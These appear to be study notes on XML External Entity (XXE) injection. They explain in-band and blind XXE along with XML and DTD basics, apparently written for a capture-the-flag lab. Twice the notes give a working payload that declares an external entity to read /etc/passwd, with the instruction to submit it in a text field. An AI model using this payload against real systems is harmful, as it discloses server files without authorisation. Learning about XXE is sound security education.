XML External Entity

- in-band
    - direct response to a XXE payload
- out-of-band
    - (blind XXE)
    - no direct response and response hast to be redirected

Example:

Textfield with Submit:

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Submit an look for possible Output.


# XML

=> extensible Markup Language, 

- Markup to save and transport DATA
- platformindependet
- easy adaptable
- Validation per DTD Schema

Example:

```
<?xml version="1.0" encoding="UTF-8"?>
<rootelement>
  <childelement></childelement>
  <andereschild attribut="asdf"></andereschild>
</rootelement>
```

# DTD

DTD = Document Type Definition, defines Structure, legal Elements and Attributes of a XML Document

Example:

note.dtd
```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

usage.xml
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

-   !DOCTYPE note = defines a root element with the name note
-   !ELEMENT note = defines which element has to contain note
-   !ELEMENT to = defines "to" as a\#PCDATA type
- \#PCDATA = parseable character Data

second Payload Example:

```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

-   !ENTITY name = gets the value "feast" and is used
-   !ENTITY read SYSTEM = use the SYSTEM Keyword